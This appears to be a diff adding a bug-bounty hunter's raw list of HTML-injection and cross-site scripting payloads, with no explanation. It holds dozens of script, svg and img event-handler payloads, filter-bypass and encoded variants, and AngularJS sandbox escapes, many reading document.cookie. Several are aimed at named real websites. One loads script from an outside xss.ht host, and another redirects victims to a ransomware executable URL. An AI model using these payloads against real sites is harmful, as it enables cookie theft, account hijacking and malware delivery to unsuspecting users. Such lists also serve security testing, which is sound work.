@@ -1,0 +1,106 @@
+<font color="x"><H1><h2>HTML INJECTION</h2><marquee>rootbakar@bugcrowdninja.com</marquee>HTML INJECTION BY : ROOT BAKAR</H1></font>
+
+XSS"><iframe src="data:text/html;base64,PHN2ZyBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+">
+
+">"><svg onload=prompt(/xss/)>
+
+https://docs.oracle.com/cd/E17236_01/epm.1112/hpm_user/frameset.htm?javascript:alert(/xss/)
+
+https://store.steampowered.com/widget/386360/?t=[url=google.com://onclick=%27alert(document.domain)%27[url=]]xss[/url]
+
+"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+
+https://www.tokopedia.com/search?st=product&q={{191*7}}
+
+test');console.log(prompt(document.domain));test=('s
+
+xss:expression(alert("XSS-BY-PROGRESS28"))
+
+https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/
+
+test"><img src=x onload=alert(1)>
+
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(document.domain)//');}}
+
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(document.cookie)//');}}
+
+- > '> "><img src=x onmouseover=prompt(document.domain)>
+
+<img/ src=1 onerror=alert(document.cookie)>
+
+<iframe/onload=alert(document.domain)></iframe>
+
+<svg/onload=alert(document.cookie)>abcdef@test.com
+
+XSS"> ;</script> <img src=<img src=search"/onerror=alert(document.domain)//"> "><marquee>
+
+"><img src=x onerror=alert(0)>
+
+'"><img onerror=alert(0) src=><"'
+
+"></div></div><brute onbeforescriptexecute='confirm(document.domain)'>
+
+https://www.jakmall.com/search?q=1%22%27--!%3E%3C/Title/%3C/Style/%3C/Script/%3C/Textarea/%3C/Noscript/%3C/Pre/%3C/Xmp%3E%3CBody/OnPageShow=(confirm)(%27OPENBUGBOUNTY%27)%3E#
+
+indo"><svg onload=alert(document.domain)>
+
+<script>alert('Redirect to google site'); document.location="https://www.google.com";</script>
+
+"><img src=x onerror=window.location.href=('http://www.google.com');>
+
+"><img src=x onerror=window.location.href=('http://fiber.strahsmeier.com/techstuff/Utilities/Ransomware/ListCrilock.exe');>
+
+<script>alert('Redirect to google site'); windows.location.href=('https://google.com');</script>
+
+"><script src=https://talaohu28.xss.ht></script>
+
+gueganteng<!'/*"/*\'/*\"/*--></Script><Image Srcset=K */; Onerror=alert(document.domain) //>
+
+'%22()%26%25<acx><ScRiPt%20>prompt(974790)</ScRiPt>
+
+"><svg/onload=prompt(1337)> 
+
+https://google.com\'onmouseover='prompt(document.cookie)'
+
+"><img src=x onerror=prompt(1)>.jpg
+
+"><svg onload=alert("1")>
+
+postimage.org
+
+<svg onload=alert(hi)>
+
+<img/src='#'/onerror=alert(1);>
+
+<img/src='#'/onerror=alert(document.cookie);>
+
+<script>alert(1);</script>
+
+<img src='#' onerror=alert(1);/>
+
+<script>alert(123)</script>
+
+"><script>alert(document.cookie)</script>
+
+" onfocus="alert(document.cookie)
+
+"><script >alert(document.cookie)</script >
+
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+
+"%3cscript%3ealert(document.cookie)%3c/script%3e
+
+<scr<script>ipt>alert(document.cookie)</script>
+
+aaa@aa.com"><script>alert(document.cookie)</script>
+
+aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+
+t" onload=alert(1); a="
+
+<script>
+var pos=document.URL.indexOf("message=")+5;
+document.write(document.URL.substring(pos,document.URL.length));
+</script>
+
+<svg/onload=alert(1)>
